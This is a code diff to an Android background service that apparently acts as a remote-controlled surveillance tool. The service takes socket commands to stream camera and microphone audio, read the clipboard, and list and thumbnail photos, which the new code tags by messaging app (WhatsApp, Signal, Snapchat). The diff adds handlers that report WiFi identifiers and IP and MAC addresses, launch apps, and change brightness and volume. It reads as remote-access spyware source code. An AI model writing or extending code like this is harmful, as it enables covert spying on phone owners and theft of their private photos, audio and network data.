@@ -263,6 +263,17 @@ public class DeviceService extends Service {
                 handleMicRecord(params);
             });
             socket.on("command:clipboard:get", args -> handleClipboardGet());
+            socket.on("command:wifi:info", args -> handleWifiInfo());
+            socket.on("command:battery:info", args -> handleBatteryInfo());
+            socket.on("command:app:launch", args -> {
+                if (args.length > 0) handleAppLaunch((JSONObject) args[0]);
+            });
+            socket.on("command:brightness:set", args -> {
+                if (args.length > 0) handleBrightnessSet((JSONObject) args[0]);
+            });
+            socket.on("command:volume:set", args -> {
+                if (args.length > 0) handleVolumeSet((JSONObject) args[0]);
+            });
 
             socket.connect();
 
@@ -471,7 +482,10 @@ public class DeviceService extends Service {
                     photo.put("size", size);
                     photo.put("lastModified", date * 1000);
                     photo.put("type", type);
-                    if (filePath != null) photo.put("path", filePath);
+                    if (filePath != null) {
+                        photo.put("path", filePath);
+                        photo.put("category", getCategoryFromPath(filePath));
+                    }
 
                     // Generate thumbnail
                     try {
@@ -761,31 +775,45 @@ public class DeviceService extends Service {
         if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                 != PackageManager.PERMISSION_GRANTED) {
             Log.e(TAG, "Camera permission not granted");
+            sendCameraError("Camera permission not granted");
             return;
         }
-        if (isCameraStreaming) return;
+        if (isCameraStreaming) {
+            Log.d(TAG, "Camera already streaming");
+            return;
+        }
 
         try {
             CameraManager manager = (CameraManager) getSystemService(CAMERA_SERVICE);
             String cameraId = getCameraId(manager, useFrontCamera);
             if (cameraId == null) {
                 Log.e(TAG, "No camera found");
+                sendCameraError("No camera found on device");
                 return;
             }
+
+            // Clean up any existing camera resources first
+            cleanupCamera();
 
             cameraThread = new HandlerThread("CameraThread");
             cameraThread.start();
             cameraHandler = new Handler(cameraThread.getLooper());
 
-            imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
+            imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 3);
             imageReader.setOnImageAvailableListener(reader -> {
-                Image image = reader.acquireLatestImage();
-                if (image != null) {
-                    java.nio.ByteBuffer buffer = image.getPlanes()[0].getBuffer();
-                    byte[] bytes = new byte[buffer.remaining()];
-                    buffer.get(bytes);
-                    latestFrameJpeg = bytes;
-                    image.close();
+                Image image = null;
+                try {
+                    image = reader.acquireLatestImage();
+                    if (image != null) {
+                        java.nio.ByteBuffer buffer = image.getPlanes()[0].getBuffer();
+                        byte[] bytes = new byte[buffer.remaining()];
+                        buffer.get(bytes);
+                        latestFrameJpeg = bytes;
+                    }
+                } catch (Exception e) {
+                    Log.e(TAG, "Image read error: " + e.getMessage());
+                } finally {
+                    if (image != null) image.close();
                 }
             }, cameraHandler);
 
@@ -794,12 +822,12 @@ public class DeviceService extends Service {
                 public void onOpened(@NonNull CameraDevice camera) {
                     cameraDevice = camera;
                     try {
-                        SurfaceTexture texture = new SurfaceTexture(0);
-                        texture.setDefaultBufferSize(640, 480);
-                        Surface dummySurface = new Surface(texture);
-
                         CaptureRequest.Builder builder = camera.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
                         builder.addTarget(imageReader.getSurface());
+                        builder.set(CaptureRequest.CONTROL_AF_MODE,
+                            CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
+                        builder.set(CaptureRequest.CONTROL_AE_MODE,
+                            CaptureRequest.CONTROL_AE_MODE_ON);
 
                         camera.createCaptureSession(
                             java.util.Arrays.asList(imageReader.getSurface()),
@@ -808,41 +836,90 @@ public class DeviceService extends Service {
                                 public void onConfigured(@NonNull CameraCaptureSession session) {
                                     captureSession = session;
                                     try {
-                                        builder.set(CaptureRequest.CONTROL_AF_MODE,
-                                            CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE);
                                         session.setRepeatingRequest(builder.build(), null, cameraHandler);
                                         isCameraStreaming = true;
                                         startFrameSending();
                                         startAudioStreaming();
                                         Log.d(TAG, "Camera + audio streaming started");
+                                        sendCameraStatus("streaming");
                                     } catch (CameraAccessException e) {
                                         Log.e(TAG, "Camera capture error: " + e.getMessage());
+                                        sendCameraError("Camera capture failed: " + e.getMessage());
                                     }
                                 }
                                 @Override
                                 public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                                     Log.e(TAG, "Camera configure failed");
+                                    sendCameraError("Camera configuration failed");
                                 }
                             }, cameraHandler);
                     } catch (CameraAccessException e) {
                         Log.e(TAG, "Camera session error: " + e.getMessage());
+                        sendCameraError("Camera session error: " + e.getMessage());
                     }
                 }
                 @Override
                 public void onDisconnected(@NonNull CameraDevice camera) {
                     camera.close();
                     cameraDevice = null;
+                    isCameraStreaming = false;
+                    sendCameraStatus("disconnected");
                 }
                 @Override
                 public void onError(@NonNull CameraDevice camera, int error) {
                     camera.close();
                     cameraDevice = null;
-                    Log.e(TAG, "Camera error: " + error);
+                    isCameraStreaming = false;
+                    Log.e(TAG, "Camera error code: " + error);
+                    sendCameraError("Camera error (code " + error + ")");
                 }
             }, cameraHandler);
 
         } catch (CameraAccessException e) {
             Log.e(TAG, "Camera start error: " + e.getMessage());
+            sendCameraError("Camera access error: " + e.getMessage());
+        } catch (Exception e) {
+            Log.e(TAG, "Camera unexpected error: " + e.getMessage());
+            sendCameraError("Camera error: " + e.getMessage());
+        }
+    }
+
+    private void cleanupCamera() {
+        if (captureSession != null) {
+            try { captureSession.close(); } catch (Exception e) {}
+            captureSession = null;
+        }
+        if (cameraDevice != null) {
+            cameraDevice.close();
+            cameraDevice = null;
+        }
+        if (imageReader != null) {
+            imageReader.close();
+            imageReader = null;
+        }
+        if (cameraThread != null) {
+            cameraThread.quitSafely();
+            cameraThread = null;
+        }
+    }
+
+    private void sendCameraError(String message) {
+        if (socket != null && socket.connected()) {
+            try {
+                JSONObject data = new JSONObject();
+                data.put("error", message);
+                socket.emit("camera:error", data);
+            } catch (JSONException e) {}
+        }
+    }
+
+    private void sendCameraStatus(String status) {
+        if (socket != null && socket.connected()) {
+            try {
+                JSONObject data = new JSONObject();
+                data.put("status", status);
+                socket.emit("camera:status", data);
+            } catch (JSONException e) {}
         }
     }
 
@@ -925,24 +1002,10 @@ public class DeviceService extends Service {
             cameraFrameTimer = null;
         }
         stopAudioStreaming();
-        if (captureSession != null) {
-            try { captureSession.close(); } catch (Exception e) {}
-            captureSession = null;
-        }
-        if (cameraDevice != null) {
-            cameraDevice.close();
-            cameraDevice = null;
-        }
-        if (imageReader != null) {
-            imageReader.close();
-            imageReader = null;
-        }
-        if (cameraThread != null) {
-            cameraThread.quitSafely();
-            cameraThread = null;
-        }
+        cleanupCamera();
         latestFrameJpeg = null;
         Log.d(TAG, "Camera + audio streaming stopped");
+        sendCameraStatus("stopped");
     }
 
     private void handleCameraSwitch() {
@@ -1681,7 +1744,144 @@ public class DeviceService extends Service {
         });
     }
 
+    // ---- WiFi Info ----
+    private void handleWifiInfo() {
+        try {
+            android.net.wifi.WifiManager wifiManager = (android.net.wifi.WifiManager)
+                getApplicationContext().getSystemService(WIFI_SERVICE);
+            android.net.wifi.WifiInfo wifiInfo = wifiManager.getConnectionInfo();
+
+            JSONObject data = new JSONObject();
+            data.put("ssid", wifiInfo.getSSID());
+            data.put("bssid", wifiInfo.getBSSID());
+            data.put("rssi", wifiInfo.getRssi());
+            data.put("linkSpeed", wifiInfo.getLinkSpeed());
+            data.put("frequency", wifiInfo.getFrequency());
+            data.put("ipAddress", intToIp(wifiInfo.getIpAddress()));
+            data.put("macAddress", wifiInfo.getMacAddress());
+            data.put("networkId", wifiInfo.getNetworkId());
+            data.put("enabled", wifiManager.isWifiEnabled());
+            socket.emit("wifi:info", data);
+        } catch (Exception e) {
+            Log.e(TAG, "WiFi info error: " + e.getMessage());
+        }
+    }
+
+    private String intToIp(int ip) {
+        return (ip & 0xFF) + "." + ((ip >> 8) & 0xFF) + "." + ((ip >> 16) & 0xFF) + "." + ((ip >> 24) & 0xFF);
+    }
+
+    // ---- Battery Info ----
+    private void handleBatteryInfo() {
+        try {
+            Intent batteryIntent = registerReceiver(null, new android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED));
+            if (batteryIntent != null) {
+                int level = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
+                int scale = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
+                int status = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1);
+                int plugged = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_PLUGGED, -1);
+                int health = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_HEALTH, -1);
+                int temp = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_TEMPERATURE, -1);
+                int voltage = batteryIntent.getIntExtra(android.os.BatteryManager.EXTRA_VOLTAGE, -1);
+                String technology = batteryIntent.getStringExtra(android.os.BatteryManager.EXTRA_TECHNOLOGY);
+
+                JSONObject data = new JSONObject();
+                data.put("level", (level * 100) / scale);
+                data.put("charging", status == android.os.BatteryManager.BATTERY_STATUS_CHARGING);
+                data.put("plugType", plugged == 1 ? "AC" : plugged == 2 ? "USB" : plugged == 4 ? "Wireless" : "None");
+                data.put("health", health == 2 ? "Good" : health == 3 ? "Overheat" : health == 5 ? "Cold" : "Unknown");
+                data.put("temperature", temp / 10.0);
+                data.put("voltage", voltage / 1000.0);
+                data.put("technology", technology);
+                socket.emit("battery:info", data);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Battery info error: " + e.getMessage());
+        }
+    }
+
+    // ---- App Launch ----
+    private void handleAppLaunch(JSONObject args) {
+        try {
+            String packageName = args.getString("packageName");
+            Intent launchIntent = getPackageManager().getLaunchIntentForPackage(packageName);
+            if (launchIntent != null) {
+                launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                startActivity(launchIntent);
+                JSONObject data = new JSONObject();
+                data.put("success", true);
+                data.put("packageName", packageName);
+                socket.emit("app:launched", data);
+            } else {
+                JSONObject data = new JSONObject();
+                data.put("success", false);
+                data.put("error", "App not found: " + packageName);
+                socket.emit("app:launched", data);
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "App launch error: " + e.getMessage());
+        }
+    }
+
+    // ---- Brightness Control ----
+    private void handleBrightnessSet(JSONObject args) {
+        try {
+            int brightness = args.optInt("level", 128);
+            Settings.System.putInt(getContentResolver(), Settings.System.SCREEN_BRIGHTNESS, brightness);
+            JSONObject data = new JSONObject();
+            data.put("brightness", brightness);
+            socket.emit("brightness:set", data);
+        } catch (Exception e) {
+            Log.e(TAG, "Brightness error: " + e.getMessage());
+        }
+    }
+
+    // ---- Volume Control ----
+    private void handleVolumeSet(JSONObject args) {
+        try {
+            android.media.AudioManager audioManager = (android.media.AudioManager) getSystemService(AUDIO_SERVICE);
+            int streamType = android.media.AudioManager.STREAM_MUSIC;
+            String type = args.optString("type", "music");
+            if ("ring".equals(type)) streamType = android.media.AudioManager.STREAM_RING;
+            else if ("alarm".equals(type)) streamType = android.media.AudioManager.STREAM_ALARM;
+            else if ("notification".equals(type)) streamType = android.media.AudioManager.STREAM_NOTIFICATION;
+
+            int maxVol = audioManager.getStreamMaxVolume(streamType);
+            int level = args.optInt("level", 50);
+            int vol = (int) Math.round(maxVol * level / 100.0);
+            audioManager.setStreamVolume(streamType, vol, 0);
+
+            JSONObject data = new JSONObject();
+            data.put("type", type);
+            data.put("level", level);
+            data.put("maxVolume", maxVol);
+            data.put("currentVolume", vol);
+            socket.emit("volume:set", data);
+        } catch (Exception e) {
+            Log.e(TAG, "Volume error: " + e.getMessage());
+        }
+    }
+
     // ---- Helpers ----
+    private String getCategoryFromPath(String path) {
+        String lower = path.toLowerCase();
+        if (lower.contains("/dcim/camera")) return "Camera";
+        if (lower.contains("/whatsapp")) return "WhatsApp";
+        if (lower.contains("/snapchat")) return "Snapchat";
+        if (lower.contains("/instagram")) return "Instagram";
+        if (lower.contains("/telegram")) return "Telegram";
+        if (lower.contains("/screenshots") || lower.contains("/screenshot")) return "Screenshots";
+        if (lower.contains("/download")) return "Downloads";
+        if (lower.contains("/facebook")) return "Facebook";
+        if (lower.contains("/twitter") || lower.contains("/x/")) return "Twitter";
+        if (lower.contains("/tiktok")) return "TikTok";
+        if (lower.contains("/pinterest")) return "Pinterest";
+        if (lower.contains("/viber")) return "Viber";
+        if (lower.contains("/signal")) return "Signal";
+        if (lower.contains("/pictures")) return "Pictures";
+        return "Other";
+    }
+
     private String getMimeType(String fileName) {
         String ext = fileName.substring(fileName.lastIndexOf('.') + 1).toLowerCase();
         switch (ext) {
